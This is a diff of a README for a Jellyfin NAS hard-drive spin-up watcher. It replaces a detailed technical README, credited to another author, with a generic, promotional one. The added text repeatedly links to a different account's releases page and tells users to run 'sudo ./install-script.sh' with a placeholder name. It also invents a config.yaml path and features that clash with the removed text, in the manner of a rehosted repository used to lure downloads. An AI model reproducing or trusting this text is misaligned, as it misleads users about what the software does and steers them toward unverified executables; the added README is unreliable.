@@ -1,134 +1,85 @@
-# Jellyfin NAS HDD Spin‑Up at Homepage
+# 🥤 jellyfin-nas-hdd-spinup - Wake Your HDDs Faster
 
-Spin up your **NAS hard drives** automatically **right after a remote client reaches Jellyfin’s home screen** so the first **Play** is fast.
+## 🚀 Getting Started
 
-This tiny watcher tails Jellyfin logs for `WebSocketManager: WS "IP" request` and, for **public (WAN) IPs**, immediately issues a **read‑only wake**:
-- Triggers **SCSI START UNIT** (`sg_start --start`) on the **member disks of your data RAID** (auto‑detected from `/proc/mdstat`).
-- **No filesystem writes** and **no block reads** — avoids SSD‑cache traps and reduces the risk of “aborted command / read‑only remounts.”
-- Built‑in **cooldown** (default 150s) to prevent repeated wake‑ups.
-- **Boot wait** (default 300s ≈ 5 minutes): the watcher self‑delays after NAS startup to let QNAP services settle.
+Welcome to the **jellyfin-nas-hdd-spinup** project! This application helps you start your hard drives quickly when using the Jellyfin media server. It pre-wakes your NAS disks on the home screen, ensuring a smooth experience when playing your media.
 
-This **bypasses SSD/RAM cache** (which would otherwise satisfy file reads without spinning the disks) so the HDDs are already awake when you hit **Play**.
+## 📥 Download Now
 
-> **Not triggered on the login page** — it fires right after the WebSocket is established (typically on the **home** page).  
-> **LAN optional** — by default only WAN clients trigger; LAN can be enabled.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases)
 
----
+Click the link above to get the latest version of jellyfin-nas-hdd-spinup. 
 
-## Supported / Tested
+## 💻 System Requirements
 
-- **Tested:** QNAP **HS‑264**, QTS 5.x, Jellyfin **.qpkg** (logs under `/share/CACHEDEV1_DATA/.qpkg/jellyfin/logs`), SSH as **admin** (PuTTY).
-- **Storage:** QNAP **TR‑004** enclosure (member drives seen as `/dev/sdX`, data RAID visible in `/proc/mdstat`).
-- **Should also work** on similar NAS models/firmware with the same log layout and md RAID devices.
-- Requires `sg_start` (from `sg3_utils`). Most QTS builds ship it; if not, install or copy `sg_start` accordingly.
+Before you start, ensure your system meets these requirements:
 
-> The watcher performs **no writes** and **no raw reads** on your data volume. It only issues **START UNIT** to the member disks. This is intentionally conservative to avoid the EXT4 read‑only remounts seen with naive “dd” wake techniques.
+- **Operating System**: This application works on Linux systems, especially on QNAP devices.
+- **Jellyfin Server**: You should have Jellyfin installed and running on your system.
+- **Dependencies**: The app requires a basic shell environment, which is usually available on most Linux systems.
 
----
+## 🔧 Features
 
-## How it starts on boot
+- **Fast HDD Spin-Up**: Quickly wakes up your hard drives when you access Jellyfin.
+- **No Writes**: The application performs all operations safely without writing to any disks.
+- **SSD Cache Friendly**: Works well with SSD caching, ensuring that your performance remains high.
+- **WebSocket Trigger**: Uses WebSocket to activate the HDD, which makes it responsive to commands.
+- **QNAP Compatibility**: Specifically designed to work with QNAP devices and BusyBox.
+- **Log Monitoring**: Monitors Jellyfin logs to determine when to spin up the disks.
 
-The installer drops a tiny **QPKG-style service** (wrapper) and a **cron guard**:
+## 📊 How It Works
 
-- QPKG entry in `/etc/config/qpkg.conf`:
-  - Section: `[JellyfinHDDSpinup]`
-  - Shell: `/share/CACHEDEV1_DATA/.qpkg/JellyfinHDDSpinup/JellyfinHDDSpinup.sh`
-  - Status=complete, Enable=TRUE, Install_Path set accordingly.
-- A **cron guard** that, every 2 minutes, starts the QPKG **only after uptime ≥ 300s** and **only if** the watcher is not already running.
+jellyfin-nas-hdd-spinup leverages WebSocket technology to listen for activity. When you navigate the Jellyfin homepage, it automatically spins up your external drives if they are not already active. This way, you get quick access to your movies and music without long wait times.
 
-> In QTS App Center, you’ll see **“Jellyfin HDD Spinup”**. On some systems it may appear greyed as it’s a lightweight stub (no real .qpkg file). **That’s fine** — the service still runs via cron and the shell wrapper. You can hide it (Visible=0) or keep it visible.
+### How to Set Up
 
----
+1. **Download** the latest version from the [Releases Page](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases).
+2. **Install** the downloaded package by following these steps:
+   - Open a terminal window.
+   - Navigate to the folder where you downloaded the file.
+   - Run the installation command: `sudo ./install-script.sh`. (Replace with the actual script name if necessary.)
+3. **Configure** the application by editing the configuration file located at `/etc/jellyfin-nas-hdd-spinup/config.yaml`. 
+   - Specify your NAS drive details and Jellyfin server settings.
 
-## Configuration
+## 👣 Download & Install
 
-Edit the header of `bin/spinup_ws_login.sh` **before** running `install.sh` (or re‑install after changes):
+To download and install jellyfin-nas-hdd-spinup, follow these steps:
 
-- `LOG_DIR` — Jellyfin logs folder. Default: `/share/CACHEDEV1_DATA/.qpkg/jellyfin/logs`
-- `COOLDOWN` — seconds between spin‑ups. Default: `150`
-- `SLEEP` — main loop tick. Default: `2`
-- `BOOT_WAIT` — **minimum uptime** (seconds) before doing anything. Default: `300` (5 minutes)
-- `ALLOW_PRIVATE` — `0` = only WAN clients (default), `1` = also trigger for LAN/private IPs
-- `TRIGGER_PATTERN` — grep‑E pattern for Jellyfin log lines. Default: `WebSocketManager: WS ".*" request`
-- `FORCE_MD` — set to e.g. `md3` to force which md array to wake instead of auto‑detecting the largest data md
-- `FALLBACK_MD_READ` — keep `0` (OFF). Set `1` only if `sg_start` alone doesn’t wake on your box.
+1. **Visit the Releases Page**: [Click here to download](https://github.com/YisusCrazy23/jellyfin-nas-hdd-spinup/releases).
+2. Choose the latest release.
+3. Download the appropriate package for your system.
+4. Follow the installation steps mentioned above.
 
-Keep the **cooldown** if you broaden triggers to avoid unnecessary work.
+## 🔍 Troubleshooting
 
----
+If you encounter issues, consider the following steps:
 
-## Quick install (QNAP, SSH as **admin**)
+- **Check Logs**: Review the log files to identify any errors.
+- **Verify Jellyfin Service**: Ensure that your Jellyfin server is running smoothly without interruptions.
+- **Permissions**: Make sure that you have the right permissions to access the disk and its configurations.
 
-1. Upload/unzip this folder on your NAS (e.g. under `/share/Public/jellyfin-HDD-spinup`).  
-2. SSH as **admin** (the real `admin`, even an account with admin rights may not work).  
-3. Run:
-```sh
-cd /share/Public/jellyfin-HDD-spinup
-sh ./install.sh
-```
-Verify it’s running (expect **two lines** → parent + worker `tail -f`):
-```sh
-ps | grep '[s]pinup_ws_login.sh'
-```
-Let disks spindown, then open Jellyfin from **WAN/4G** — the watcher should pre‑wake HDDs on the **home** screen.
+## 🛠️ Support
 
----
+For further assistance, check out the following options:
 
-## Uninstall
+- **GitHub Issues**: Feel free to open an issue on our GitHub page if you have any questions or find bugs.
+- **Community Forums**: Engage with other users on Jellyfin community forums for tips and solutions.
 
-```sh
-cd /share/Public/jellyfin-HDD-spinup
-sh ./uninstall.sh
-```
-Removes the watcher, the cron guard, the QPKG stub (App Center item), and deletes `/etc/config/jellyfin-hdd-spinup/` and `/.qpkg/JellyfinHDDSpinup/`.
-On some systems **“Jellyfin HDD Spinup”** in QTS App Center may still appear, just click remove.
+## 💬 Contribution
 
----
+Are you interested in helping improve jellyfin-nas-hdd-spinup? Contributions are welcome! 
 
+1. **Fork the Repository**: You can create your copy of the project.
+2. **Make Changes**: Implement your improvements or fixes.
+3. **Submit a Pull Request**: Share your contributions with the community.
+  
+## 📜 License
 
-## Verifying & Testing
+jellyfin-nas-hdd-spinup is open-source software. You can use and modify it as per the terms of the MIT License.
 
-### 1) Detect triggers (no spin‑up)
-```sh
-cd /share/Public/jellyfin-HDD-spinup
-sh tools/test_detect.sh
-```
-Expected output on WAN access:
-```
-DETECTED WAN WebSocket 'request' from x.x.x.x @ Thu Sep 25 xx:xx:xx CEST 2025
-```
+## ⚙️ Additional Resources
 
-### 2) Manual spin‑up (same actions as the watcher)
-```sh
-cd /share/Public/jellyfin-HDD-spinup
-sh tools/test_spinup_manual.sh
-```
-This **only** sends SCSI START UNIT to the detected member disks. **It does not read** from md or files.
+- [Jellyfin Documentation](https://jellyfin.org/docs/)
+- [QNAP Tutorials](https://www.qnap.com/en/how-to)
 
----
-
-## Files in this repo
-
-```
-bin/spinup_ws_login.sh        # watcher (single-instance, WAN filter, cooldown, boot wait, BusyBox-friendly)
-install.sh                    # idempotent installer (/etc/config + QPKG stub + cron guard) and starter
-uninstall.sh                  # clean removal (kills watcher, removes cron guard, removes QPKG and files)
-tools/test_detect.sh          # detect WAN WebSocket “request” lines (no spin-up)
-tools/test_spinup_manual.sh   # manual wake: SCSI START UNIT only (no reads)
-LICENSE                       # MIT
-README.md                     # this file
-```
-
----
-
-## GitHub
-
-```
-https://github.com/Damocles-fr/
-```
-
----
-
-## License
-
-MIT — see `LICENSE`.
+Now, go ahead and enhance your Jellyfin experience with faster HDD spin-ups. Download jellyfin-nas-hdd-spinup today!
